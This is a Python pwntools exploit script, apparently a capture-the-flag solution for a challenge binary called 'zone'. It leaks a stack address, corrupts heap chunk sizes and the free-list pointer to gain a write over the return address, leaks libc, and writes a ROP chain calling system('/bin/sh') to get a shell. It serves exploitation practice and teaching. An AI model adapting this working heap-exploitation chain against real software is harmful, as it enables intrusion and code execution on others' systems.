# Import pwntools
from pwn import *

# Establish the target process
target = process('./zone')
#gdb.attach(target)

# pop rdi ; ret 
gadget = 0x404653

# Establish the offsets to binsh, system, and the rop gadget we need
binsh = 0x16c527
system = 0x24b60


# Establish the functions to interact with the program
def alloc(size):
	target.recvuntil('5) Exit\n')
	target.sendline('1')
	target.sendline(str(size))

def delete():
	target.recvuntil('5) Exit\n')
	target.sendline("2")

def write(data):
	target.recvuntil('5) Exit\n')
	target.sendline("3")
	target.sendline(data)

def printb():
	target.recvuntil('5) Exit\n')
	target.sendline("4")

def ret():
	target.sendline("5")

# Get the stack infoleak, and filter it out. Also calculate the address for the fake block.
leak = target.recvline()
leak = leak.replace("Environment setup: ", "")
leak = int(leak, 16)
fakeBlock = leak + 0x78
log.info("Stack leak is: " + hex(leak))
log.info("Fake Block address is: " + hex(fakeBlock))

# Allocate the first block, and overwrite the size value of the next block with 0x80
alloc(64)
write("\x80"*65)

# Allocate the block with the overwritten size value, then free it
alloc(64)
delete()

# Allocate the block we just freed, since it was added to the free list of size 0x80
alloc(128)

# Overwrite the next free block pointer of the next chunk to point to the return address
payload = "0"*0x40 + p64(0x40) + p64(fakeBlock)  
write(payload)

# Allocate two more chunks to get a block that points to the return address we can write to
alloc(64)
alloc(64)

# Print the contents of the return address for an infoleak, and filter it out
printb()
libcLeak = target.recvline()
libcLeak = libcLeak.replace("\x0a", "")
libcLeak = u64(libcLeak + "\x00"*2)
log.info("Libc infoleak: " + hex(libcLeak))

# Form the payload to get rce, and write it
payload = p64(gadget) + p64(libcLeak + binsh) + p64(libcLeak + system)
write(payload) 

# Exit the function to execute our payload
ret()

# Drop to an interactive shell to use the shell
log.info("Enjoy your slay XD. I might listen to Ice Nine Kills a bit too much")
target.interactive()
